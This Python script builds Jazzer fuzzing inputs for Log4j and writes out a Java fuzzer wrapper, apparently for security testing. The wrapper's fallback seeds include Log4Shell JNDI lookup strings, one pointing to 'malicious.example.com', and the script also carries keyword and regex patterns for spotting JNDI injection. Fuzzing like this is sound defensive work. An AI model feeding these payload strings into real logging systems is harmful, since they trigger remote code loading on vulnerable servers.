import os
import json
import re

def load_test_cases(filename="cleaned_test_cases.json"):
    """Load the cleaned test cases."""
    test_case_path = f"generated_tests/{filename}"
    if not os.path.exists(test_case_path):
        print(f"Test cases file not found at {test_case_path}. Please run clean_test_cases.py first.")
        return None

    with open(test_case_path, 'r') as f:
        return json.load(f)

def generate_jazzer_dictionary(test_cases, output_path="generated_tests/log4j_dictionary.dict"):
    """Generate a dictionary file for Jazzer based on test cases."""
    unique_tokens = set()

    # Extract tokens from test cases
    for test_case in test_cases:
        # Skip extremely long test cases
        if len(test_case) > 1000:
            continue

        # Add the full test case (if not too long)
        if len(test_case) < 200:
            unique_tokens.add(test_case)

        # Add smaller parts that might be interesting
        parts = re.findall(r'[${}%][a-zA-Z0-9_]*', test_case)
        for part in parts:
            if len(part) < 100:  # Skip extremely long parts
                unique_tokens.add(part)

        # Add any patterns that look like format specifiers
        format_specs = re.findall(r'%[a-zA-Z]', test_case)
        unique_tokens.update(format_specs)

    # Write to dictionary file, ensuring valid entries
    with open(output_path, 'w') as f:
        for token in unique_tokens:
            if token.strip():  # Skip empty tokens
                # Filter out non-ASCII characters
                token = ''.join(c for c in token if ord(c) < 128)

                # Escape double quotes and backslashes
                escaped_token = token.replace('\\', '\\\\').replace('"', '\\"')

                # Write the token with proper quoting
                f.write(f'"{escaped_token}"\n')

    print(f"Generated Jazzer dictionary with {len(unique_tokens)} tokens at {output_path}")
    return output_path

def create_corpus_files(test_cases, corpus_dir="generated_tests/corpus"):
    """Create corpus files for Jazzer based on test cases."""
    os.makedirs(corpus_dir, exist_ok=True)

    for i, test_case in enumerate(test_cases):
        file_path = os.path.join(corpus_dir, f"test_case_{i}.txt")
        with open(file_path, 'w') as f:
            f.write(test_case)

    print(f"Created {len(test_cases)} corpus files in {corpus_dir}")
    return corpus_dir

def extract_patterns_from_fuzz_methods(fuzz_methods_dir, output_corpus_dir):
    """Extract interesting test patterns from LLM-generated fuzz methods."""
    import re
    import os

    # Ensure output directory exists
    os.makedirs(output_corpus_dir, exist_ok=True)

    # Get the current highest test case number
    existing_files = [f for f in os.listdir(output_corpus_dir) if f.startswith("test_case_")]
    next_test_num = 0
    if existing_files:
        nums = [int(re.search(r"test_case_(\d+)\.txt", f).group(1)) for f in existing_files if re.search(r"test_case_(\d+)\.txt", f)]
        if nums:
            next_test_num = max(nums) + 1

    # Patterns to extract (regex patterns for interesting inputs)
    patterns = [
        r'"(.*?${jndi:.*?}.*?)"',  # JNDI patterns
        r'"(%.*?%n)"',              # Log pattern layouts
        r'"({.*?})"',               # JSON patterns
        r'"(.*?\\.*?)"',            # Escape sequences
        r'"(.*?%\{.*?\}.*?)"'       # MDC/NDC patterns
    ]

    # Read all fuzz method files
    all_methods_file = os.path.join(fuzz_methods_dir, "all_methods.java")
    if not os.path.exists(all_methods_file):
        print(f"File not found: {all_methods_file}")
        return []

    with open(all_methods_file, 'r') as f:
        content = f.read()

    # Extract all matches
    extracted_patterns = []
    for pattern in patterns:
        matches = re.findall(pattern, content)
        extracted_patterns.extend(matches)

    # Remove duplicates
    extracted_patterns = list(set(extracted_patterns))

    # Save to corpus files
    added_files = []
    for pattern in extracted_patterns:
        # Clean up the pattern
        pattern = pattern.replace('\\"', '"').replace('\\\\', '\\')

        # Skip if it's too short or just contains common characters
        if len(pattern) < 3 or pattern.strip() in ['{}', '[]', '()', '%n', '%m']:
            continue

        # Write to file
        filename = os.path.join(output_corpus_dir, f"test_case_{next_test_num}.txt")
        with open(filename, 'w') as f:
            f.write(pattern)
        added_files.append(filename)
        next_test_num += 1

    print(f"Added {len(added_files)} new test cases extracted from fuzz methods")
    return added_files

def generate_enhanced_fuzzer_wrapper():
    """Generate a wrapper for the log4j fuzzer that uses our generated tests."""
    wrapper_path = "../Log4jFuzzerWrapper.java"

    with open(wrapper_path, 'w') as f:
        f.write("""package org.example;

import com.code_intelligence.jazzer.api.FuzzedDataProvider;
import com.code_intelligence.jazzer.api.FuzzerSecurityIssueHigh;
import java.io.File;
import java.io.FileReader;
import java.io.BufferedReader;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;

public class Log4jFuzzerWrapper {
    private static final List<String> TEST_CASES = new ArrayList<>();
    private static final Random RANDOM = new Random();
    
    static {
        // Load test cases from our generated files
        try {
            File corpusDir = new File("llm_fuzzer/generated_tests/corpus");
            if (corpusDir.exists() && corpusDir.isDirectory()) {
                for (File file : corpusDir.listFiles()) {
                    if (file.isFile() && file.getName().endsWith(".txt")) {
                        try (BufferedReader reader = new BufferedReader(new FileReader(file))) {
                            StringBuilder content = new StringBuilder();
                            String line;
                            while ((line = reader.readLine()) != null) {
                                content.append(line).append("\\n");
                            }
                            TEST_CASES.add(content.toString());
                        }
                    }
                }
                System.out.println("Loaded " + TEST_CASES.size() + " test cases from corpus directory");
            } else {
                System.out.println("Corpus directory not found, using default test cases");
                // Add some default test cases in case our corpus isn't available
                TEST_CASES.add("${jndi:ldap://malicious.example.com/payload}");
                TEST_CASES.add("%d{yyyy-MM-dd HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n");
                TEST_CASES.add("{\"key\": \"value\", \"jndi\": \"${jndi:rmi://localhost:1099/jndiLookup}\"}");
            }
        } catch (IOException e) {
            System.err.println("Error loading test cases: " + e.getMessage());
        }
    }
    
    public static void fuzzerTestOneInput(FuzzedDataProvider data) {
        try {
            // Randomly determine if we should use a predefined test case or generated data
            boolean usePredefined = data.consumeBoolean();
            
            if (usePredefined && !TEST_CASES.isEmpty()) {
                // Use one of our predefined test cases
                int index = data.consumeInt(0, TEST_CASES.size() - 1);
                String testCase = TEST_CASES.get(index);
                
                // Create a new FuzzedDataProvider with our chosen test case data
                byte[] testCaseBytes = testCase.getBytes();
                FuzzedDataProvider wrappedData = new FuzzedDataProvider(testCaseBytes);
                
                // Call the original fuzzer with our data
                Log4jFuzzer.fuzzerTestOneInput(wrappedData);
            } else {
                // Let Jazzer generate data normally
                Log4jFuzzer.fuzzerTestOneInput(data);
            }
        } catch (Exception e) {
            // Report high severity security issues for certain exceptions
            if (isSecurityException(e)) {
                throw new FuzzerSecurityIssueHigh("Potential security issue detected: " + e.getMessage());
            }
            // Otherwise just let the original fuzzer handle the exception
            throw e;
        }
    }
    
    private static boolean isSecurityException(Exception e) {
        // Check for security-relevant exceptions
        String message = e.getMessage() != null ? e.getMessage().toLowerCase() : "";
        return message.contains("jndi") || 
               message.contains("remote") || 
               message.contains("injection") || 
               message.contains("deserialization") ||
               e instanceof SecurityException;
    }
}
""")

    print(f"Generated enhanced fuzzer wrapper at {wrapper_path}")
    return wrapper_path

def print_jazzer_command(dictionary_path):
    """Print the command to run Jazzer with the enhanced wrapper and dictionary."""
    print("\nTo run Jazzer with the enhanced wrapper and generated dictionary, use this command:")
    print(f"""
JAVA_TOOL_OPTIONS="-javaagent:$HOME/.m2/repository/org/jacoco/org.jacoco.agent/0.8.10/org.jacoco.agent-0.8.10-runtime.jar=destfile=target/jacoco.exec" \\
../jazzer-cli/jazzer \\
--cp=target/classes:$(cat classpath.txt) \\
--target_class=org.example.Log4jFuzzerWrapper \\
'--instrumentation_includes=org.apache.logging.log4j.**' \\
-dict=llm_fuzzer/generated_tests/log4j_dictionary.dict \\
-seed=12345 \\
-runs=10000
""")

if __name__ == "__main__":
    try:
        test_cases = load_test_cases()
        if test_cases:
            dictionary_path = generate_jazzer_dictionary(test_cases)
            corpus_dir = create_corpus_files(test_cases)
            wrapper_path = generate_enhanced_fuzzer_wrapper()
            print_jazzer_command(dictionary_path)
        else:
            print("No test cases found. Please run clean_test_cases.py first.")
    except Exception as e:
        print(f"Error: {e}")
        import traceback
        traceback.print_exc()